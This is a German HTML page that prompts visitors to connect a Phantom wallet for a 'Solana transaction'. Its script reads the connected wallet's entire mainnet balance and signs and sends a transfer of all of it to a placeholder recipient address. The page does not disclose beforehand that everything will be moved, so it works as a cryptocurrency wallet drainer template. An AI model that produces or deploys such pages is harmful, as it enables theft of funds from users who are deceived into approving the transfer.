<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Transaktion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            margin-top: 50px;
        }
        .button {
            padding: 15px 30px;
            background-color: #4CAF50;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        .button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Willkommen bei der Solana Transaktion</h1>
        <p>Verbinden Sie sich mit Ihrer Phantom Wallet, um die Transaktion zu starten.</p>
        <button class="button" id="connectButton">Mit Phantom verbinden</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
    <script>
        document.getElementById('connectButton').addEventListener('click', async () => {
            if (window.solana && window.solana.isPhantom) {
                try {
                    // Verbindung zur Phantom Wallet herstellen
                    await window.solana.connect();

                    // Wallet Public Key abrufen
                    const publicKey = window.solana.publicKey;

                    // Solana-Netzwerk-Verbindung
                    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');

                    // Guthaben abrufen
                    const balance = await connection.getBalance(publicKey);

                    // Zieladresse (Beispiel-Wallet)
                    const recipient = new solanaWeb3.PublicKey('IHRE_ZIELADRESSE_HIER');

                    // Transaktion erstellen
                    const transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: recipient,
                            lamports: balance,
                        })
                    );

                    // Transaktion signieren und senden
                    const signature = await window.solana.signAndSendTransaction(transaction);

                    // Transaktion best√§tigen
                    await connection.confirmTransaction(signature, 'confirmed');

                    alert('Transaktion erfolgreich! Die gesamte Balance wurde gesendet.');
                } catch (error) {
                    console.error('Fehler:', error);
                    alert('Fehler bei der Verbindung oder Transaktion.');
                }
            } else {
                alert('Bitte installieren Sie Phantom Wallet, um diese Funktion zu nutzen.');
            }
        });
    </script>

</body>
</html>
